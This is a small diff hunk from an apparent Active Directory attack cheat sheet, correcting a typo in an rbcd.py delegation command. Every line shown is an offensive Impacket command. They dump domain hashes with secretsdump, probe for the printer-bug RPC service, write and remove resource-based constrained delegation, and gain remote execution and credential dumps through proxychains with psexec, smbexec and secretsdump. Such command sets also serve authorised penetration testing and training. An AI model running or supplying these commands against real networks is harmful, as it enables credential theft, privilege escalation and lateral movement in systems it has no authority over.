@@ -45,7 +45,7 @@ secretsdump -outputfile "$DOMAIN" -just-dc -hashes :"$NT_HASH" "$DOMAIN"/"$USER"
 rpcdump.py "$DC_HOST" | grep -A 6 MS-RPRN
 rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action remove "$DOMAIN"/"$USER":"$PASSWORD"
 rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "$DOMAIN"/"$USER":"$PASSWORD"
-rbcd.py t-delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
+rbcd.py -delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
 proxychains psexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains secretsdump -no-pass "$DOMAIN"/"$USER"@"$TARGET"
 proxychains smbexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
